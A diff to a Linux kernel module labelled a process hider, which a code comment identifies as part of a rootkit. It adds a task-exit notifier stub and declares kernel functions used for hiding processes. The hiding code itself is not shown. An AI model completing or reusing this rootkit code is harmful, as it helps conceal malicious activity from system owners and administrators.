@@ -1,9 +1,17 @@
 #include <linux/pid.h>
 #include <linux/sched.h> // for task_struct
 #include <linux/rculist.h>
+#include <linux/profile.h>
 
 #include "messagesToUser.h"
 #include "processHider.h"
+
+#ifndef CONFIG_PROFILING
+	#error "this module requires config profiling enabled"
+#endif
+
+
+
 //#include "doExitHijack.h"
 
 
@@ -13,9 +21,18 @@ void detach_pid(struct task_struct *task, enum pid_type type);
 void change_pid(struct task_struct *task, enum pid_type type,
 		struct pid *pid);
 void free_pid(struct pid *pid);
-//
-
 static int hideProcess(int pidNumber);
+
+
+int notificationFunction(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task) {
+	printInfo("in notification function for exit :)\n");
+	return 0;
+}
+struct notifier_block notificationOnProcessExit = {
+	.notifier_call = notificationFunction,
+	.next = NULL,// TODO: CHECK THIS
+	.priority = 1, // TODO: CHECK THIS
+};
 
 
 int processHider_init(void) {
@@ -25,12 +42,28 @@ int processHider_init(void) {
 	//TODO: check if hid is already hidden - trying to hide it multiple times causes issues
 
 	//replacement_do_exit(0);
+
+	//TODO: check value returned..
+
+	// this will fail if profiling is disabled
+	int error = profile_event_register(PROFILE_TASK_EXIT, &notificationOnProcessExit);
+	if (error != 0) { //todo : extract function..
+		return error;
+	}
+
+
+
 	return 0;
 }
 
 
 void processHider_exit(void) {
-	// show the process  perhaps.. otherwise it may be hide to kill / end it so that the rootkit is not visable
+	// TODO: show the process  perhaps.. otherwise it may be hide to kill / end it so that the rootkit is not visable
+		// alternatively kill them / require that the tasks are dead first..
+
+	//TODO: ensure code is not in notifier when exit is progress / going to be called..
+	int error;
+	error = profile_event_unregister(PROFILE_TASK_EXIT, &notificationOnProcessExit);
 }
 
 
